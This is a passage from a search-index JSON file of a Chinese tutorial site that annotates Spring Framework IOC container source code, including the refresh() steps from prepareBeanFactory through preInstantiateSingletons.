{\n                // beanDefinitionMap\u200b\u5b58\u50a8\u200bbeanName:BeanDefinition\u200b\u4e00\u4e00\u5bf9\u5e94\u200b\u7684\u200bK:V\u200b\u4fe1\u606f\u200b\n                // beanName\u200b\u4f5c\u4e3a\u200bkey\uff0c beanDefinition\u200b\u4f5c\u4e3a\u200bvalue\u200b\u5b58\u5165\u200bDefaultListableBeanFactory\u200b\u5bf9\u8c61\u200b\u7684\u200bbeanDefinitionMap\u200b\u5b57\u6bb5\u200b\u4e2d\u200b\n                // \u200b\u5b8c\u6210\u200bBean\u200b\u7684\u200b\u6ce8\u518c\u200b\uff0c\u200b\u5c06\u200bBean\u200b\u6ce8\u518c\u200b\u5230\u200bBeanFactory\u200b\u4e2d\u200b\n                this.beanDefinitionMap.put(beanName, beanDefinition);\n                List&lt;String&gt; updatedDefinitions = new ArrayList&lt;&gt;(this.beanDefinitionNames.size() + 1);\n                updatedDefinitions.addAll(this.beanDefinitionNames);\n                updatedDefinitions.add(beanName);\n                // \u200b\u5c06\u200b\u6240\u6709\u200b\u7684\u200bbeanName\u200b\u4fdd\u5b58\u200b\u5230\u200bbeanDefinitionNames\u200b\u5b57\u6bb5\u200b\u4e2d\u200b\uff0c\u200b\u6570\u636e\u7c7b\u578b\u200b\u4e3a\u200b\n                this.beanDefinitionNames = updatedDefinitions;\n                removeManualSingletonName(beanName);\n            }\n        }\n        else {\n            // Still in startup registration phase\n            this.beanDefinitionMap.put(beanName, beanDefinition);\n            this.beanDefinitionNames.add(beanName);\n            removeManualSingletonName(beanName);\n        }\n        this.frozenBeanDefinitionNames = null;\n    }\n\n    if (existingDefinition != null || containsSingleton(beanName)) {\n        resetBeanDefinition(beanName);\n    }\n}\n</code></pre>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#getbeanfactory","title":"getBeanFactory()\u200b\u65b9\u6cd5\u200b\u7684\u200b\u4e00\u79cd\u200b\u5b9e\u73b0","text":"<ul> <li>AbstractRefreshableApplicationContext\u200b\u4e2d\u200bgetBeanFactory()\u200b\u65b9\u6cd5\u200b\u7684\u200b\u4e00\u79cd\u200b\u5b9e\u73b0\u200b</li> <li>\u200b\u83b7\u53d6\u200bBeanFactory Java<pre><code>@Override\npublic final ConfigurableListableBeanFactory getBeanFactory() {\n    synchronized (this.beanFactoryMonitor) {\n        if (this.beanFactory == null) {\n           throw new IllegalStateException(\"BeanFactory not initialized or already closed - call 'refresh' before accessing beans via the ApplicationContext\");\n        }\n        return this.beanFactory;\n    }\n}\n</code></pre></li> <li>getBeanFactory()\u200b\u65b9\u6cd5\u200b\u6267\u884c\u200b\u5b8c\u200b\uff0c\u200b\u6807\u5fd7\u200b\u4e0a\u200b\u4e00\u7ea7\u200b\u7684\u200b\u65b9\u6cd5\u200bobtainFreshBeanFactory()\u200b\u6267\u884c\u200b\u5b8c\u6210\u200b\uff0c\u200b\u63a5\u4e0b\u6765\u200b\u5c06\u200b\u8fdb\u5165\u200bAbstractApplicationContext\u200b\u62bd\u8c61\u7c7b\u200b\u4e2d\u200b\u5b9a\u4e49\u200b\u7684\u200brefresh()\u200b\u6a21\u677f\u200b\u65b9\u6cd5\u200b\u4e2d\u200b\u7684\u200b\u7b2c\u4e09\u6b65\u200b\u5b9a\u4e49\u200b\u7684\u200bprepareBeanFactory(beanFactory)\u200b\u65b9\u6cd5\u200b</li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#6-preparebeanfactorybeanfactory","title":"6 prepareBeanFactory(beanFactory)\u200b\u65b9\u6cd5","text":"<ul> <li>\u200b\u4ee3\u7801\u200b\u4f4d\u7f6e\u200b: org.springframework.context.support.AbstractApplicationContext.java Java<pre><code>protected void prepareBeanFactory(ConfigurableListableBeanFactory beanFactory) {\n        // Tell the internal bean factory to use the context's class loader etc.\n        beanFactory.setBeanClassLoader(getClassLoader());\n        beanFactory.setBeanExpressionResolver(new StandardBeanExpressionResolver(beanFactory.getBeanClassLoader()));\n        beanFactory.addPropertyEditorRegistrar(new ResourceEditorRegistrar(this, getEnvironment()));\n\n        // Configure the bean factory with context callbacks.\n        beanFactory.addBeanPostProcessor(new ApplicationContextAwareProcessor(this));\n        beanFactory.ignoreDependencyInterface(EnvironmentAware.class);\n        beanFactory.ignoreDependencyInterface(EmbeddedValueResolverAware.class);\n        beanFactory.ignoreDependencyInterface(ResourceLoaderAware.class);\n        beanFactory.ignoreDependencyInterface(ApplicationEventPublisherAware.class);\n        beanFactory.ignoreDependencyInterface(MessageSourceAware.class);\n        beanFactory.ignoreDependencyInterface(ApplicationContextAware.class);\n\n        // BeanFactory interface not registered as resolvable type in a plain factory.\n        // MessageSource registered (and found for autowiring) as a bean.\n        beanFactory.registerResolvableDependency(BeanFactory.class, beanFactory);\n        beanFactory.registerResolvableDependency(ResourceLoader.class, this);\n        beanFactory.registerResolvableDependency(ApplicationEventPublisher.class, this);\n        beanFactory.registerResolvableDependency(ApplicationContext.class, this);\n\n        // Register early post-processor for detecting inner beans as ApplicationListeners.\n        beanFactory.addBeanPostProcessor(new ApplicationListenerDetector(this));\n\n        // Detect a LoadTimeWeaver and prepare for weaving, if found.\n        if (beanFactory.containsBean(LOAD_TIME_WEAVER_BEAN_NAME)) {\n            beanFactory.addBeanPostProcessor(new LoadTimeWeaverAwareProcessor(beanFactory));\n            // Set a temporary ClassLoader for type matching.\n            beanFactory.setTempClassLoader(new ContextTypeMatchClassLoader(beanFactory.getBeanClassLoader()));\n        }\n\n        // Register default environment beans.\n        if (!beanFactory.containsLocalBean(ENVIRONMENT_BEAN_NAME)) {\n            beanFactory.registerSingleton(ENVIRONMENT_BEAN_NAME, getEnvironment());\n        }\n        if (!beanFactory.containsLocalBean(SYSTEM_PROPERTIES_BEAN_NAME)) {\n            beanFactory.registerSingleton(SYSTEM_PROPERTIES_BEAN_NAME, getEnvironment().getSystemProperties());\n        }\n        if (!beanFactory.containsLocalBean(SYSTEM_ENVIRONMENT_BEAN_NAME)) {\n            beanFactory.registerSingleton(SYSTEM_ENVIRONMENT_BEAN_NAME, getEnvironment().getSystemEnvironment());\n        }\n    }\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#7-postprocessbeanfactoryconfigurablelistablebeanfactory-beanfactory","title":"7 postProcessBeanFactory(ConfigurableListableBeanFactory beanFactory)","text":"<ul> <li>\u200b\u4ee3\u7801\u200b\u4f4d\u7f6e\u200b:org.springframework.context.support.AbstractApplicationContext.java Java<pre><code>protected void postProcessBeanFactory(ConfigurableListableBeanFactory beanFactory) {\n    // \u200b\u8be5\u200b\u65b9\u6cd5\u200b\u662f\u200b\u4e00\u4e2a\u200b\u7a7a\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u5177\u4f53\u200b\u7684\u200b\u5b9e\u73b0\u200b\u4f9d\u636e\u200b\u5177\u4f53\u200b\u7684\u200b\u60c5\u51b5\u200b\u5728\u200b\u5176\u5b50\u200b\u7c7b\u4e2d\u200b\u7ee7\u627f\u200b\u6216\u200b\u8fdb\u884c\u200b\u91cd\u5199\u200b\n    // \u200b\u89c2\u5bdf\u200bAbstractApplicationContext\u200b\u5230\u200bFileSystemXmlApplicationContext(location)\u200b\u7684\u200b\u7ee7\u627f\u200b\u8def\u5f84\u200b\uff0c\u200b\u5176\u5b50\u200b\u7c7b\u4e2d\u200b\u5e76\u672a\u200b\u5b9e\u73b0\u200b\u5177\u4f53\u200b\u7684\u200b\u903b\u8f91\u200b;\n}\n</code></pre></li> <li>postProcessBeanFactory(beanFactory)\u200b\u6267\u884c\u200b\u5b8c\u540e\u200b\u8fdb\u5165\u200b invokeBeanFactoryPostProcessors(beanFactory)\u200b\u65b9\u6cd5\u200b</li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#8-invokebeanfactorypostprocessorsbeanfactory","title":"8. invokeBeanFactoryPostProcessors(beanFactory)\u200b\u65b9\u6cd5","text":"Java<pre><code>protected void invokeBeanFactoryPostProcessors(ConfigurableListableBeanFactory beanFactory) {\n    PostProcessorRegistrationDelegate.invokeBeanFactoryPostProcessors(beanFactory, getBeanFactoryPostProcessors());\n\n    // Detect a LoadTimeWeaver and prepare for weaving, if found in the meantime\n    // (e.g. through an @Bean method registered by ConfigurationClassPostProcessor)\n    if (beanFactory.getTempClassLoader() == null &amp;&amp; beanFactory.containsBean(LOAD_TIME_WEAVER_BEAN_NAME)) {\n        beanFactory.addBeanPostProcessor(new LoadTimeWeaverAwareProcessor(beanFactory));\n        beanFactory.setTempClassLoader(new ContextTypeMatchClassLoader(beanFactory.getBeanClassLoader()));\n    }\n}\n\npublic List&lt;BeanFactoryPostProcessor&gt; getBeanFactoryPostProcessors() {\n    return this.beanFactoryPostProcessors;\n}\n</code></pre> <ul> <li>PostProcessorRegistrationDelegate\u200b\u7684\u200binvokeBeanFactoryPostProcessors(ConfigurableListableBeanFactory beanFactory, List beanFactoryPostProcessors)\u200b\u9759\u6001\u65b9\u6cd5\u200b Java<pre><code>public static void invokeBeanFactoryPostProcessors(\n        ConfigurableListableBeanFactory beanFactory, List&lt;BeanFactoryPostProcessor&gt; beanFactoryPostProcessors) {\n\n    // Invoke BeanDefinitionRegistryPostProcessors first, if any.\n    Set&lt;String&gt; processedBeans = new HashSet&lt;&gt;();\n\n    if (beanFactory instanceof BeanDefinitionRegistry) {\n        BeanDefinitionRegistry registry = (BeanDefinitionRegistry) beanFactory;\n        List&lt;BeanFactoryPostProcessor&gt; regularPostProcessors = new ArrayList&lt;&gt;();\n        List&lt;BeanDefinitionRegistryPostProcessor&gt; registryProcessors = new ArrayList&lt;&gt;();\n\n        for (BeanFactoryPostProcessor postProcessor : beanFactoryPostProcessors) {\n            if (postProcessor instanceof BeanDefinitionRegistryPostProcessor) {\n                BeanDefinitionRegistryPostProcessor registryProcessor =\n                        (BeanDefinitionRegistryPostProcessor) postProcessor;\n                registryProcessor.postProcessBeanDefinitionRegistry(registry);\n                registryProcessors.add(registryProcessor);\n            }\n            else {\n                regularPostProcessors.add(postProcessor);\n            }\n        }\n\n        // Do not initialize FactoryBeans here: We need to leave all regular beans\n        // uninitialized to let the bean factory post-processors apply to them!\n        // Separate between BeanDefinitionRegistryPostProcessors that implement\n        // PriorityOrdered, Ordered, and the rest.\n        List&lt;BeanDefinitionRegistryPostProcessor&gt; currentRegistryProcessors = new ArrayList&lt;&gt;();\n\n        // First, invoke the BeanDefinitionRegistryPostProcessors that implement PriorityOrdered.\n        String[] postProcessorNames =\n                beanFactory.getBeanNamesForType(BeanDefinitionRegistryPostProcessor.class, true, false);\n        for (String ppName : postProcessorNames) {\n            if (beanFactory.isTypeMatch(ppName, PriorityOrdered.class)) {\n                currentRegistryProcessors.add(beanFactory.getBean(ppName, BeanDefinitionRegistryPostProcessor.class));\n                processedBeans.add(ppName);\n            }\n        }\n        sortPostProcessors(currentRegistryProcessors, beanFactory);\n        registryProcessors.addAll(currentRegistryProcessors);\n        invokeBeanDefinitionRegistryPostProcessors(currentRegistryProcessors, registry);\n        currentRegistryProcessors.clear();\n\n        // Next, invoke the BeanDefinitionRegistryPostProcessors that implement Ordered.\n        postProcessorNames = beanFactory.getBeanNamesForType(BeanDefinitionRegistryPostProcessor.class, true, false);\n        for (String ppName : postProcessorNames) {\n            if (!processedBeans.contains(ppName) &amp;&amp; beanFactory.isTypeMatch(ppName, Ordered.class)) {\n                currentRegistryProcessors.add(beanFactory.getBean(ppName, BeanDefinitionRegistryPostProcessor.class));\n                processedBeans.add(ppName);\n            }\n        }\n        sortPostProcessors(currentRegistryProcessors, beanFactory);\n        registryProcessors.addAll(currentRegistryProcessors);\n        invokeBeanDefinitionRegistryPostProcessors(currentRegistryProcessors, registry);\n        currentRegistryProcessors.clear();\n\n        // Finally, invoke all other BeanDefinitionRegistryPostProcessors until no further ones appear.\n        boolean reiterate = true;\n        while (reiterate) {\n            reiterate = false;\n            postProcessorNames = beanFactory.getBeanNamesForType(BeanDefinitionRegistryPostProcessor.class, true, false);\n            for (String ppName : postProcessorNames) {\n                if (!processedBeans.contains(ppName)) {\n                    currentRegistryProcessors.add(beanFactory.getBean(ppName, BeanDefinitionRegistryPostProcessor.class));\n                    processedBeans.add(ppName);\n                    reiterate = true;\n                }\n            }\n            sortPostProcessors(currentRegistryProcessors, beanFactory);\n            registryProcessors.addAll(currentRegistryProcessors);\n            invokeBeanDefinitionRegistryPostProcessors(currentRegistryProcessors, registry);\n            currentRegistryProcessors.clear();\n        }\n\n        // Now, invoke the postProcessBeanFactory callback of all processors handled so far.\n        invokeBeanFactoryPostProcessors(registryProcessors, beanFactory);\n        invokeBeanFactoryPostProcessors(regularPostProcessors, beanFactory);\n    }\n\n    else {\n        // Invoke factory processors registered with the context instance.\n        invokeBeanFactoryPostProcessors(beanFactoryPostProcessors, beanFactory);\n    }\n\n    // Do not initialize FactoryBeans here: We need to leave all regular beans\n    // uninitialized to let the bean factory post-processors apply to them!\n    String[] postProcessorNames =\n            beanFactory.getBeanNamesForType(BeanFactoryPostProcessor.class, true, false);\n\n    // Separate between BeanFactoryPostProcessors that implement PriorityOrdered,\n    // Ordered, and the rest.\n    List&lt;BeanFactoryPostProcessor&gt; priorityOrderedPostProcessors = new ArrayList&lt;&gt;();\n    List&lt;String&gt; orderedPostProcessorNames = new ArrayList&lt;&gt;();\n    List&lt;String&gt; nonOrderedPostProcessorNames = new ArrayList&lt;&gt;();\n    for (String ppName : postProcessorNames) {\n        if (processedBeans.contains(ppName)) {\n            // skip - already processed in first phase above\n        }\n        else if (beanFactory.isTypeMatch(ppName, PriorityOrdered.class)) {\n            priorityOrderedPostProcessors.add(beanFactory.getBean(ppName, BeanFactoryPostProcessor.class));\n        }\n        else if (beanFactory.isTypeMatch(ppName, Ordered.class)) {\n            orderedPostProcessorNames.add(ppName);\n        }\n        else {\n            nonOrderedPostProcessorNames.add(ppName);\n        }\n    }\n\n    // First, invoke the BeanFactoryPostProcessors that implement PriorityOrdered.\n    sortPostProcessors(priorityOrderedPostProcessors, beanFactory);\n    invokeBeanFactoryPostProcessors(priorityOrderedPostProcessors, beanFactory);\n\n    // Next, invoke the BeanFactoryPostProcessors that implement Ordered.\n    List&lt;BeanFactoryPostProcessor&gt; orderedPostProcessors = new ArrayList&lt;&gt;(orderedPostProcessorNames.size());\n    for (String postProcessorName : orderedPostProcessorNames) {\n        orderedPostProcessors.add(beanFactory.getBean(postProcessorName, BeanFactoryPostProcessor.class));\n    }\n    sortPostProcessors(orderedPostProcessors, beanFactory);\n    invokeBeanFactoryPostProcessors(orderedPostProcessors, beanFactory);\n\n    // Finally, invoke all other BeanFactoryPostProcessors.\n    List&lt;BeanFactoryPostProcessor&gt; nonOrderedPostProcessors = new ArrayList&lt;&gt;(nonOrderedPostProcessorNames.size());\n    for (String postProcessorName : nonOrderedPostProcessorNames) {\n        nonOrderedPostProcessors.add(beanFactory.getBean(postProcessorName, BeanFactoryPostProcessor.class));\n    }\n    invokeBeanFactoryPostProcessors(nonOrderedPostProcessors, beanFactory);\n\n    // Clear cached merged bean definitions since the post-processors might have\n    // modified the original metadata, e.g. replacing placeholders in values...\n    beanFactory.clearMetadataCache();\n}\n\n// \u200b\u4e0a\u9762\u200b\u7684\u200b\u65b9\u6cd5\u200b\u5185\u90e8\u200b\u6709\u200b\u8c03\u7528\u200b\u8be5\u200b\u91cd\u8f7d\u200b\u65b9\u6cd5\u200b\nprivate static void invokeBeanDefinitionRegistryPostProcessors(\n        Collection&lt;? extends BeanDefinitionRegistryPostProcessor&gt; postProcessors, BeanDefinitionRegistry registry) {\n\n    for (BeanDefinitionRegistryPostProcessor postProcessor : postProcessors) {\n        postProcessor.postProcessBeanDefinitionRegistry(registry);\n    }\n}\n\n// \u200b\u4e0a\u9762\u200b\u7684\u200b\u65b9\u6cd5\u200b\u5185\u90e8\u200b\u6709\u200b\u8c03\u7528\u200b\u8be5\u200b\u65b9\u6cd5\u200b\nprivate static void sortPostProcessors(List&lt;?&gt; postProcessors, ConfigurableListableBeanFactory beanFactory) {\n    Comparator&lt;Object&gt; comparatorToUse = null;\n    if (beanFactory instanceof DefaultListableBeanFactory) {\n        comparatorToUse = ((DefaultListableBeanFactory) beanFactory).getDependencyComparator();\n    }\n    if (comparatorToUse == null) {\n        comparatorToUse = OrderComparator.INSTANCE;\n    }\n    postProcessors.sort(comparatorToUse);\n}\n</code></pre>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#9-registerbeanpostprocessorsbeanfactory","title":"9. registerBeanPostProcessors(beanFactory);\u200b\u65b9\u6cd5","text":"<p>Java<pre><code>protected void registerBeanPostProcessors(ConfigurableListableBeanFactory beanFactory) {\n    PostProcessorRegistrationDelegate.registerBeanPostProcessors(beanFactory, this);\n}\n</code></pre> - PostProcessorRegistrationDelegate\u200b\u7684\u200bregisterBeanPostProcessors(ConfigurableListableBeanFactory beanFactory, AbstractApplicationContext applicationContexs)\u200b\u9759\u6001\u65b9\u6cd5\u200b\uff0c\u200b\u5177\u4f53\u200b\u4ee3\u7801\u200b\u5982\u4e0b\u200b\uff1a Java<pre><code>public static void registerBeanPostProcessors(\n        ConfigurableListableBeanFactory beanFactory, AbstractApplicationContext applicationContext) {\n\n    String[] postProcessorNames = beanFactory.getBeanNamesForType(BeanPostProcessor.class, true, false);\n\n    // Register BeanPostProcessorChecker that logs an info message when\n    // a bean is created during BeanPostProcessor instantiation, i.e. when\n    // a bean is not eligible for getting processed by all BeanPostProcessors.\n    int beanProcessorTargetCount = beanFactory.getBeanPostProcessorCount() + 1 + postProcessorNames.length;\n    beanFactory.addBeanPostProcessor(new BeanPostProcessorChecker(beanFactory, beanProcessorTargetCount));\n\n    // Separate between BeanPostProcessors that implement PriorityOrdered,\n    // Ordered, and the rest.\n    List&lt;BeanPostProcessor&gt; priorityOrderedPostProcessors = new ArrayList&lt;&gt;();\n    List&lt;BeanPostProcessor&gt; internalPostProcessors = new ArrayList&lt;&gt;();\n    List&lt;String&gt; orderedPostProcessorNames = new ArrayList&lt;&gt;();\n    List&lt;String&gt; nonOrderedPostProcessorNames = new ArrayList&lt;&gt;();\n    for (String ppName : postProcessorNames) {\n        if (beanFactory.isTypeMatch(ppName, PriorityOrdered.class)) {\n            BeanPostProcessor pp = beanFactory.getBean(ppName, BeanPostProcessor.class);\n            priorityOrderedPostProcessors.add(pp);\n            if (pp instanceof MergedBeanDefinitionPostProcessor) {\n                internalPostProcessors.add(pp);\n            }\n        }\n        else if (beanFactory.isTypeMatch(ppName, Ordered.class)) {\n            orderedPostProcessorNames.add(ppName);\n        }\n        else {\n            nonOrderedPostProcessorNames.add(ppName);\n        }\n    }\n\n    // First, register the BeanPostProcessors that implement PriorityOrdered.\n    sortPostProcessors(priorityOrderedPostProcessors, beanFactory);\n    registerBeanPostProcessors(beanFactory, priorityOrderedPostProcessors);\n\n    // Next, register the BeanPostProcessors that implement Ordered.\n    List&lt;BeanPostProcessor&gt; orderedPostProcessors = new ArrayList&lt;&gt;(orderedPostProcessorNames.size());\n    for (String ppName : orderedPostProcessorNames) {\n        BeanPostProcessor pp = beanFactory.getBean(ppName, BeanPostProcessor.class);\n        orderedPostProcessors.add(pp);\n        if (pp instanceof MergedBeanDefinitionPostProcessor) {\n            internalPostProcessors.add(pp);\n        }\n    }\n    sortPostProcessors(orderedPostProcessors, beanFactory);\n    registerBeanPostProcessors(beanFactory, orderedPostProcessors);\n\n    // Now, register all regular BeanPostProcessors.\n    List&lt;BeanPostProcessor&gt; nonOrderedPostProcessors = new ArrayList&lt;&gt;(nonOrderedPostProcessorNames.size());\n    for (String ppName : nonOrderedPostProcessorNames) {\n        BeanPostProcessor pp = beanFactory.getBean(ppName, BeanPostProcessor.class);\n        nonOrderedPostProcessors.add(pp);\n        if (pp instanceof MergedBeanDefinitionPostProcessor) {\n            internalPostProcessors.add(pp);\n        }\n    }\n    registerBeanPostProcessors(beanFactory, nonOrderedPostProcessors);\n\n    // Finally, re-register all internal BeanPostProcessors.\n    sortPostProcessors(internalPostProcessors, beanFactory);\n    registerBeanPostProcessors(beanFactory, internalPostProcessors);\n\n    // Re-register post-processor for detecting inner beans as ApplicationListeners,\n    // moving it to the end of the processor chain (for picking up proxies etc).\n    beanFactory.addBeanPostProcessor(new ApplicationListenerDetector(applicationContext));\n}\n\n\n//\u200b\u4e0a\u9762\u200b\u7684\u200b\u65b9\u6cd5\u200b\u5185\u90e8\u200b\u6709\u200b\u8c03\u7528\u200b\u8be5\u200b\u91cd\u8f7d\u200b\u65b9\u6cd5\u200b\nprivate static void registerBeanPostProcessors(\n        ConfigurableListableBeanFactory beanFactory, List&lt;BeanPostProcessor&gt; postProcessors) {\n\n    for (BeanPostProcessor postProcessor : postProcessors) {\n        beanFactory.addBeanPostProcessor(postProcessor);\n    }\n}\n</code></pre></p>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#10-initmessagesource","title":"10. initMessageSource();\u200b\u65b9\u6cd5","text":"<ul> <li>org.springframework.context.support.AbstractApplicationContext\u200b\u4e2d\u200b\u7684\u200binitMessageSource()\u200b\u65b9\u6cd5\u200b Java<pre><code>protected void initMessageSource() {\n    ConfigurableListableBeanFactory beanFactory = getBeanFactory();\n    if (beanFactory.containsLocalBean(MESSAGE_SOURCE_BEAN_NAME)) {\n        this.messageSource = beanFactory.getBean(MESSAGE_SOURCE_BEAN_NAME, MessageSource.class);\n        // Make MessageSource aware of parent MessageSource.\n        if (this.parent != null &amp;&amp; this.messageSource instanceof HierarchicalMessageSource) {\n            HierarchicalMessageSource hms = (HierarchicalMessageSource) this.messageSource;\n            if (hms.getParentMessageSource() == null) {\n                // Only set parent context as parent MessageSource if no parent MessageSource\n                // registered already.\n                hms.setParentMessageSource(getInternalParentMessageSource());\n            }\n        }\n        if (logger.isTraceEnabled()) {\n            logger.trace(\"Using MessageSource [\" + this.messageSource + \"]\");\n        }\n    }\n    else {\n        // Use empty MessageSource to be able to accept getMessage calls.\n        DelegatingMessageSource dms = new DelegatingMessageSource();\n        dms.setParentMessageSource(getInternalParentMessageSource());\n        this.messageSource = dms;\n        beanFactory.registerSingleton(MESSAGE_SOURCE_BEAN_NAME, this.messageSource);\n        if (logger.isTraceEnabled()) {\n            logger.trace(\"No '\" + MESSAGE_SOURCE_BEAN_NAME + \"' bean, using [\" + this.messageSource + \"]\");\n        }\n    }\n}\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#11-initapplicationeventmulticaster","title":"11. initApplicationEventMulticaster();\u200b\u65b9\u6cd5","text":"<ul> <li>org.springframework.context.support.AbstractApplicationContext\u200b\u4e2d\u200b\u7684\u200binitApplicationEventMulticaster()\u200b\u65b9\u6cd5\u200b Java<pre><code>protected void initApplicationEventMulticaster() {\n    ConfigurableListableBeanFactory beanFactory = getBeanFactory();\n    if (beanFactory.containsLocalBean(APPLICATION_EVENT_MULTICASTER_BEAN_NAME)) {\n        this.applicationEventMulticaster =\n                beanFactory.getBean(APPLICATION_EVENT_MULTICASTER_BEAN_NAME, ApplicationEventMulticaster.class);\n        if (logger.isTraceEnabled()) {\n            logger.trace(\"Using ApplicationEventMulticaster [\" + this.applicationEventMulticaster + \"]\");\n        }\n    }\n    else {\n        this.applicationEventMulticaster = new SimpleApplicationEventMulticaster(beanFactory);\n        beanFactory.registerSingleton(APPLICATION_EVENT_MULTICASTER_BEAN_NAME, this.applicationEventMulticaster);\n        if (logger.isTraceEnabled()) {\n            logger.trace(\"No '\" + APPLICATION_EVENT_MULTICASTER_BEAN_NAME + \"' bean, using \" +\n                    \"[\" + this.applicationEventMulticaster.getClass().getSimpleName() + \"]\");\n        }\n    }\n}\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#12-onrefresh","title":"12. onRefresh();\u200b\u65b9\u6cd5","text":"<ul> <li>org.springframework.context.support.AbstractApplicationContext\u200b\u4e2d\u200b\u7684\u200bonRefresh()\u200b\u65b9\u6cd5\u200b Java<pre><code>protected void onRefresh() throws BeansException {\n    // \u200b\u8be5\u200b\u65b9\u6cd5\u200b\u662f\u200b\u4e00\u4e2a\u200b\u7a7a\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u5177\u4f53\u200b\u7684\u200b\u5b9e\u73b0\u200b\u4f9d\u636e\u200b\u5177\u4f53\u200b\u7684\u200b\u60c5\u51b5\u200b\u5728\u200b\u5176\u5b50\u200b\u7c7b\u4e2d\u200b\u7ee7\u627f\u200b\u6216\u200b\u8fdb\u884c\u200b\u91cd\u5199\u200b\n    // For subclasses: do nothing by default.\n}\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#13-registerlisteners","title":"13. registerListeners();\u200b\u65b9\u6cd5","text":"<ul> <li>org.springframework.context.support.AbstractApplicationContext\u200b\u4e2d\u200b\u7684\u200bregisterListeners()\u200b\u65b9\u6cd5\u200b Java<pre><code>    protected void registerListeners() {\n        // Register statically specified listeners first.\n        for (ApplicationListener&lt;?&gt; listener : getApplicationListeners()) {\n            getApplicationEventMulticaster().addApplicationListener(listener);\n        }\n\n        // Do not initialize FactoryBeans here: We need to leave all regular beans\n        // uninitialized to let post-processors apply to them!\n        String[] listenerBeanNames = getBeanNamesForType(ApplicationListener.class, true, false);\n        for (String listenerBeanName : listenerBeanNames) {\n            getApplicationEventMulticaster().addApplicationListenerBean(listenerBeanName);\n        }\n\n        // Publish early application events now that we finally have a multicaster...\n        Set&lt;ApplicationEvent&gt; earlyEventsToProcess = this.earlyApplicationEvents;\n        this.earlyApplicationEvents = null;\n        if (earlyEventsToProcess != null) {\n            for (ApplicationEvent earlyEvent : earlyEventsToProcess) {\n                getApplicationEventMulticaster().multicastEvent(earlyEvent);\n            }\n        }\n    }\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#14-finishbeanfactoryinitializationbeanfactory","title":"14. finishBeanFactoryInitialization(beanFactory);\u200b\u65b9\u6cd5","text":"<ul> <li>org.springframework.context.support.AbstractApplicationContext\u200b\u4e2d\u200b\u7684\u200bfinishBeanFactoryInitialization(beanFactory)\u200b\u65b9\u6cd5\u200b</li> <li>\u200b\u5b9e\u4f8b\u200b\u5316\u200bBean\u200b\u7684\u200b\u6838\u5fc3\u200b\u65b9\u6cd5\u200b Java<pre><code>protected void finishBeanFactoryInitialization(ConfigurableListableBeanFactory beanFactory) {\n    // Initialize conversion service for this context.\n    if (beanFactory.containsBean(CONVERSION_SERVICE_BEAN_NAME) &amp;&amp;\n            beanFactory.isTypeMatch(CONVERSION_SERVICE_BEAN_NAME, ConversionService.class)) {\n        beanFactory.setConversionService(\n                beanFactory.getBean(CONVERSION_SERVICE_BEAN_NAME, ConversionService.class));\n    }\n\n    // Register a default embedded value resolver if no bean post-processor\n    // (such as a PropertyPlaceholderConfigurer bean) registered any before:\n    // at this point, primarily for resolution in annotation attribute values.\n    if (!beanFactory.hasEmbeddedValueResolver()) {\n        beanFactory.addEmbeddedValueResolver(strVal -&gt; getEnvironment().resolvePlaceholders(strVal));\n    }\n\n    // Initialize LoadTimeWeaverAware beans early to allow for registering their transformers early.\n    String[] weaverAwareNames = beanFactory.getBeanNamesForType(LoadTimeWeaverAware.class, false, false);\n    for (String weaverAwareName : weaverAwareNames) {\n        getBean(weaverAwareName);\n    }\n\n    // Stop using the temporary ClassLoader for type matching.\n    beanFactory.setTempClassLoader(null);\n\n    // Allow for caching all bean definition metadata, not expecting further changes.\n    beanFactory.freezeConfiguration();\n\n    // Instantiate all remaining (non-lazy-init) singletons.\n    // \u200b\u5b9e\u4f8b\u200b\u5316\u200bbean\u200b\u7684\u200b\u6838\u5fc3\u200b\u4ee3\u7801\u200b\n    beanFactory.preInstantiateSingletons(); \n    // \u200b\u4e0a\u200b\u4e00\u884c\u200b\u7684\u200bpreInstantiateSingletons()\u200b\u65b9\u6cd5\u200b\u5b9a\u4e49\u200b\u5728\u200bConfigurableListableBeanFactory\u200b\u63a5\u53e3\u200b\u4e2d\u200b\uff0c\n    // \u200b\u5177\u4f53\u200b\u5b9e\u73b0\u200b\u662f\u200b\u5728\u200bDefaultListableBeanFactory\u200b\u4e2d\u200bpreInstantiateSingletons()\u200b\u65b9\u6cd5\u200b\n}\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#defaultlistablebeanfactorypreinstantiatesingletons","title":"DefaultListableBeanFactory\u200b\u4e2d\u200bpreInstantiateSingletons()\u200b\u65b9\u6cd5","text":"Java<pre><code>@Override\npublic void preInstantiateSingletons() throws BeansException {\n    if (logger.isTraceEnabled()) {\n        logger.trace(\"Pre-instantiating singletons in \" + this);\n    }\n\n    // Iterate over a copy to allow for init methods which in turn register new bean definitions.\n    // While this may not be part of the regular factory bootstrap, it does otherwise work fine.\n    List&lt;String&gt; beanNames = new ArrayList&lt;&gt;(this.beanDefinitionNames);\n\n    // Trigger initialization of all non-lazy singleton beans...\n    // \u200b\u904d\u5386\u200bbeanDefinitionNames\u200b\u8fd9\u4e2a\u200bArrayList\u200b\u5bf9\u8c61\u200b\u4e2d\u200b\u7684\u200bbeanName\uff0c\n    for (String beanName : beanNames) {\n        RootBeanDefinition bd = getMergedLocalBeanDefinition(beanName);\n        if (!bd.isAbstract() &amp;&amp; bd.isSingleton() &amp;&amp; !bd.isLazyInit()) {\n            if (isFactoryBean(beanName)) {\n                Object bean = getBean(FACTORY_BEAN_PREFIX + beanName);\n                if (bean instanceof FactoryBean) {\n                    final FactoryBean&lt;?&gt; factory = (FactoryBean&lt;?&gt;) bean;\n                